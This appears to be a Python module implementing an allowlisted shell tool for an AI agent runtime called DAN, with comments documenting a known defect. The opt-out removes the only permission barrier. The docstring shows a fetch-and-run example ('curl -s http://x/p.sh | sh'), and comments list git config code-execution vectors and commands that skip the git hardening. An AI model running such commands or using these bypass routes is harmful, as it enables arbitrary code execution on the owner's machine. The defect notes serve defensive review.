"""Shell tools.

The active runtime exposes the read-only shell tool directly to DAN.
State-changing shell remains a separate placeholder.

Safety model for shell_read:
- Model-originated calls execute directly and are recorded in tool_runs/events.
- Only normalized whitelist matches execute, unless the owner opted out below.
- Scrubbed environment, bounded runtime, bounded output, optional cwd that
  must stay inside the approved roots.

The allowlist is an EXACT match on the whole normalized command, so any command
carrying an argument the operator did not pre-register is refused. That is the
right default for a shared runtime and useless for a personal one: the live log
shows DAN refused `ls -la ~/Documents/.develop`. The owner of a local,
localhost-only runtime can therefore opt out with ``unrestricted=True``
(config: ``security.shell_read_unrestricted``).

KNOWN DEFECT (2026-07-21): that opt-out is not the narrow change it sounds
like, because the allowlist was the ONLY barrier in front of the shell. Nothing
gates this tool — ``ToolPermissionPolicy.decide`` returns ALLOW for every risk
class and every source — and ``run`` hands the command to
``subprocess.run(..., shell=True)`` with no metacharacter handling, so
``shell_read {"command": "curl -s http://x/p.sh | sh"}`` executes. Of the
guarantees listed above, only the scrubbed environment and the runtime/output
bounds survive intact: approved-root containment binds ``cwd``, never argv, and
the git hardening stops being exhaustive (the ``argv[0] == "git"`` test in
``run``). The tool still reports ``risk="shell_read"`` and describes itself to
the model as read-only.
docs/reviews/2026-07-21-restart-orphan-shell-review.md §2-§5.
"""

from __future__ import annotations

import copy
import os
import shlex
import subprocess
from collections.abc import Iterable, Mapping
from typing import Any

from dan.tools.registry import Tool, ToolExecutionError


DEFAULT_SHELL_READ_WHITELIST: tuple[str, ...] = (
    "pwd",
    "ls",
    "ls -la",
    "date",
    "whoami",
    "id",
    "uname -a",
    "sw_vers",
    "uptime",
    "df -h",
    "git status --short",
    "git log --oneline -10",
    "git diff --stat",
    "git log --oneline -20",
    "git show --stat HEAD",
)

SHELL_TIMEOUT_SECONDS = 15
MAX_OUTPUT_CHARS = 65_536

_SCRUBBED_ENV = {
    "PATH": "/opt/homebrew/bin:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin",
    "LANG": "C.UTF-8",
    "LC_ALL": "C.UTF-8",
}

# Reading a repository executes repository-controlled configuration unless it
# is disarmed first. A `git status` inside a hostile checkout is arbitrary code
# execution: `core.fsmonitor` names a program git runs, `core.hooksPath` points
# at scripts it invokes, and `protocol.ext` lets a submodule/remote URL spawn a
# helper command. System and global config are silenced too, so the result of a
# read-only command cannot depend on machine state outside this process.
# These are security barriers, not cosmetics — do not drop them.
_GIT_ENV_HARDENING = {
    "GIT_CONFIG_NOSYSTEM": "1",
    "GIT_CONFIG_GLOBAL": "/dev/null",
}
_GIT_ARGV_HARDENING = (
    "-c",
    "core.fsmonitor=",
    "-c",
    "core.hooksPath=/dev/null",
    "-c",
    "protocol.ext.allow=never",
)


class ShellReadTool(Tool):
    name = "shell_read"
    # This text and the `command` schema describe the DEFAULT, allowlisted
    # tool. An unrestricted instance replaces both in __init__ — see
    # _UNRESTRICTED_* below. Until 2026-07-21 it did not, so the brain was told
    # "allowlisted" and "read-only" while the instance ran arbitrary commands,
    # and planned against a constraint that was not enforced (review §2).
    description = (
        "Run one configured read-only allowlisted command and return bounded "
        "stdout/stderr; optional cwd must stay inside DAN-approved roots."
    )
    risk = "shell_read"
    input_schema = {
        "type": "object",
        "properties": {
            "command": {
                "type": "string",
                "description": "Exact command from the runtime's read-only allowlist.",
            },
            "cwd": {
                "type": "string",
                "description": "Optional working directory.",
            },
        },
        "required": ["command"],
    }

    # What an unrestricted instance says about itself. The point is not
    # politeness: the brain decides what to attempt from this text, so calling
    # a full shell "read-only allowlisted" suppresses safe work and hides the
    # blast radius of the rest.
    _UNRESTRICTED_DESCRIPTION = (
        "Run a shell command and return bounded stdout/stderr. The command "
        "allowlist is OFF on this runtime, so this is NOT read-only: anything "
        "the owner could type in a terminal runs, including commands that "
        "write, delete or reach the network, and the string is handed to a "
        "shell so pipes, redirection and chaining apply. Only `cwd` is "
        "contained to DAN-approved roots — the command itself is not."
    )
    _UNRESTRICTED_COMMAND_DESCRIPTION = (
        "Shell command to run. No allowlist applies on this runtime; treat it "
        "with the care you would a terminal on the owner's account."
    )

    def __init__(
        self,
        *,
        whitelist: Iterable[str] | None = None,
        approved_roots: Iterable[str] | None = None,
        unrestricted: bool = False,
    ):
        self.whitelist = tuple(
            _normalize_command(entry) for entry in (whitelist or DEFAULT_SHELL_READ_WHITELIST)
        )
        self.approved_roots = tuple(_normalize_path(root) for root in (approved_roots or ()))
        self.unrestricted = bool(unrestricted)
        if self.unrestricted:
            # Instance attributes shadow the class ones, and every consumer
            # reads them off the instance (dan/brain/claude_cli_adapter.py,
            # dan/mcp/memory_server.py), so this is what the model actually
            # sees. deepcopy because the class schema is shared mutable state.
            self.description = self._UNRESTRICTED_DESCRIPTION
            schema = copy.deepcopy(type(self).input_schema)
            schema["properties"]["command"]["description"] = (
                self._UNRESTRICTED_COMMAND_DESCRIPTION
            )
            self.input_schema = schema

    def run(self, arguments: Mapping[str, Any]) -> Mapping[str, Any]:
        command = _required_command_argument(arguments)
        normalized = _normalize_command(command)
        if not self.unrestricted and normalized not in self.whitelist:
            raise ToolExecutionError(
                f"shell_read command is not whitelisted: {normalized}"
            )

        cwd = self._resolve_cwd(arguments)
        env = dict(_SCRUBBED_ENV)
        # Reassembled through shlex.quote: the string goes back to a shell, so
        # an allowlist entry carrying a space or a quote must not be re-parsed
        # into extra words.
        # KNOWN DEFECT: this argv[0] test was exhaustive only while the
        # allowlist held commands to a fixed set of literals. With
        # unrestricted=True, `/usr/bin/git status`, `cd sub && git status`,
        # `env git status` and `sh -c 'git status'` all reach git without the
        # hardening below — which is exactly the arbitrary code execution the
        # comment above _GIT_ENV_HARDENING describes. The new test only covers
        # the literal `git status --short`, so it passes over the hole.
        # Review §3.
        argv_check = shlex.split(normalized)
        if argv_check and argv_check[0] == "git":
            hardening = " ".join(_GIT_ARGV_HARDENING)
            rest = " ".join(shlex.quote(part) for part in argv_check[1:])
            normalized = f"git {hardening} {rest}"
            env.update(_GIT_ENV_HARDENING)

        try:
            completed = subprocess.run(
                normalized,
                capture_output=True,
                timeout=SHELL_TIMEOUT_SECONDS,
                shell=True,
                env=env,
                cwd=cwd,
            )
        except subprocess.TimeoutExpired as exc:
            raise ToolExecutionError(
                f"shell_read command timed out after {SHELL_TIMEOUT_SECONDS}s."
            ) from exc
        except OSError as exc:
            raise ToolExecutionError(f"shell_read cannot execute command: {exc}") from exc

        stdout, stdout_truncated = _clip_output(completed.stdout)
        stderr, stderr_truncated = _clip_output(completed.stderr)
        return {
            "ok": completed.returncode == 0,
            "command": normalized,
            "cwd": cwd,
            "returncode": completed.returncode,
            "stdout": stdout,
            "stdout_truncated": stdout_truncated,
            "stderr": stderr,
            "stderr_truncated": stderr_truncated,
        }

    def _resolve_cwd(self, arguments: Mapping[str, Any]) -> str:
        raw_cwd = arguments.get("cwd")
        if raw_cwd is None:
            if not self.approved_roots:
                raise ToolExecutionError(
                    "shell_read cannot run because no approved roots are configured."
                )
            return self.approved_roots[0]
        if not isinstance(raw_cwd, str) or not raw_cwd.strip():
            raise ToolExecutionError("shell_read cwd must be a non-empty string.")

        resolved = _normalize_path(raw_cwd.strip())
        if not os.path.isdir(resolved):
            raise ToolExecutionError(f"shell_read cwd is not a directory: {resolved}")
        if not any(_is_within_root(resolved, root) for root in self.approved_roots):
            raise ToolExecutionError(
                f"shell_read cwd is outside approved roots: {resolved}"
            )
        return resolved


class ShellReadPlaceholderTool(Tool):
    name = "shell_read_placeholder"
    description = "Placeholder for future read-only shell commands; does not execute."
    risk = "shell_read"
    input_schema = {"type": "object"}

    def run(self, arguments: Mapping[str, Any]) -> Mapping[str, Any]:
        return {"ok": False, "message": "Shell execution is not implemented."}


class ShellWritePlaceholderTool(Tool):
    name = "shell_write_placeholder"
    description = "Placeholder for future mutating shell commands; does not execute."
    risk = "shell_write"
    input_schema = {"type": "object"}

    def run(self, arguments: Mapping[str, Any]) -> Mapping[str, Any]:
        return {"ok": False, "message": "Shell execution is not implemented."}


class ShellTool(ShellReadPlaceholderTool):
    """Backward-compatible placeholder name for the initial scaffold."""


def _required_command_argument(arguments: Mapping[str, Any]) -> str:
    raw_command = arguments.get("command")
    if not isinstance(raw_command, str) or not raw_command.strip():
        raise ToolExecutionError("shell_read requires a non-empty command argument.")
    return raw_command


def _normalize_command(command: str) -> str:
    return " ".join(command.split())


def _clip_output(raw: bytes) -> tuple[str, bool]:
    text = raw.decode("utf-8", errors="replace")
    if len(text) > MAX_OUTPUT_CHARS:
        return text[:MAX_OUTPUT_CHARS], True
    return text, False


def _normalize_path(path: str) -> str:
    return os.path.realpath(os.path.abspath(os.path.expanduser(path)))


def _is_within_root(candidate: str, approved_root: str) -> bool:
    try:
        return os.path.commonpath([candidate, approved_root]) == approved_root
    except ValueError:
        return False


__all__ = [
    "DEFAULT_SHELL_READ_WHITELIST",
    "MAX_OUTPUT_CHARS",
    "SHELL_TIMEOUT_SECONDS",
    "ShellReadPlaceholderTool",
    "ShellReadTool",
    "ShellTool",
    "ShellWritePlaceholderTool",
]
